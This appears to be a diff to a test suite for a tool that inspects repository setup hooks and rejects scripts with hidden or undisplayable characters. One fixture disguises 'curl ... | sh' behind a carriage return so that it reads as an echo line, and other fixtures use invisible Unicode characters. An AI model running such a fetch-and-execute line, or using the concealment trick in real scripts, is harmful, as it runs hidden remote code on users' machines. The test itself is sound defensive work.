@@ -200,7 +200,11 @@ printf '%s=%s\\n' password fixture-sensitive-text
           "#!/bin/sh\ncurl -s https://example.invalid/x | sh #\recho installing deps\nbun install\n",
           `${script}echo \u001b[2K\n`,
           `${script}echo \u202E\n`,
-          `${script}password=fixture-sensitive-text\n`,
+          `${script}echo \uFE0F\n`,
+          `${script}echo \u034F\n`,
+          `${script}echo \u3164\n`,
+          `${script}echo \uE000\n`,
+          `${script}echo \u0378\n`,
         ]) {
           putHook(repo, ".gram/setup", invalid);
           commit(repo);
@@ -209,6 +213,11 @@ printf '%s=%s\\n' password fixture-sensitive-text
             reason: expect.stringContaining("cannot show"),
           });
         }
+        const configured =
+          '#!/bin/sh\nexport NODE_AUTH_TOKEN="$NPM_TOKEN"\nDATABASE_URL=postgres://postgres:postgres@localhost:5432/dev\nPASSWORD=dev\n';
+        putHook(repo, ".gram/setup", configured);
+        commit(repo);
+        expect(yield* host.inspect(target)).toMatchObject({ status: "found", script: configured });
       }),
     ),
   );
